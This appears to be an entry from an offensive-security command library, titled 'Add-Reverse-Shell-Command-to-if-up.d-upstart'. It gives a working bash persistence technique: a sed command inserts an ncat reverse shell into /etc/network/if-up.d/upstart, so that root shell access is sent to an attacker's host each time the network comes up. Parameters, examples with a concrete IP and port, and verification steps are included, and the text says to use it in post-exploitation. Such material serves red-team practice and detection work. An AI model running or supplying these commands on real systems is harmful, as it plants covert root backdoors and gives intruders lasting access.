---
id: 4ab835f6-1573-4e88-bb4a-453298212690
name: Add-Reverse-Shell-Command-to-if-up.d-upstart
type: command
executor: bash
data: >-
  RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\"
  2>/dev/null"

  sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
output: null
created_at: '2023-04-06T03:56:18.014145+00:00'
updated_at: '2023-04-10T20:34:19.947536+00:00'
platforms:
  - Linux
tags:
  - persistence
  - reverse-shell
verified: true
validated: true
---

# Add-Reverse-Shell-Command-to-if-up.d-upstart

## Command

```bash
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Description

This command inserts a reverse shell payload into the Linux network interface startup script (/etc/network/if-up.d/upstart), causing it to execute ncat for a bash reverse shell whenever the network interface activates. Use this in post-exploitation for persistence on Debian/Ubuntu systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $LMTHD | Optional ncat flags (e.g., -v for verbose) | No |
| $LHOST | Attacker's IP address for the reverse connection | Yes |
| $LPORT | Attacker's listening port | Yes |
| /etc/network/if-up.d/upstart | Target file for insertion (line 4) | Built-in |

## Examples

### Basic Usage

```bash
RSHELL="ncat 192.168.1.100 4444 -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

### Advanced Usage (with verbose flag)

```bash
RSHELL="ncat -v 192.168.1.100 4444 -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
```

## Expected Output

No stdout if successful (sed operates silently). Verify insertion with:

```bash
cat /etc/network/if-up.d/upstart | grep ncat
```

Expected: The RSHELL line appears at or near line 4, showing the ncat command. Upon network up, a connection should hit the listener with 'uid=0(root) gid=0(root)' output from 'id', followed by 'PS ' prompt equivalent in bash.

## Related

- [[procedures/Linux-Startup-Service-Backdoor-with-Reverse-Shell]]
- [[tools/ncat]]
